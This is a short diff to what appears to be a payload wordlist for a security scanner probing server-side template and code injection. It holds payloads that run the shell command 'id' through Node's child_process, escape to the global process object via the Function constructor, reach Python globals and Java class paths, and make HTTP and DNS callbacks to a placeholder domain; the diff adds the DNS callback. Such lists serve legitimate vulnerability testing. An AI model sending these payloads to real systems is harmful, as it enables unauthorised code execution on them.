@@ -21,7 +21,8 @@ undefined
 ${class.getResource("").getPath()}
 __init__.__globals__["{module}"].config
 ${global.process.mainModule.require('child_process').execSync('id')}
-${global.process.mainModule.require('http').get({host:'{domain}', port:80, path:'/callback'})}
+${global.process.mainModule.require('http').get({host:'{domain}',port:80,path:'/callback'})}
+${global.process.mainModule.require('dns').resolve('{domain}',() =>{})}
 }});console.log("{canary}");// 
 constructor.constructor('alert("{canary}")')()
 this.constructor.constructor("return global")().process
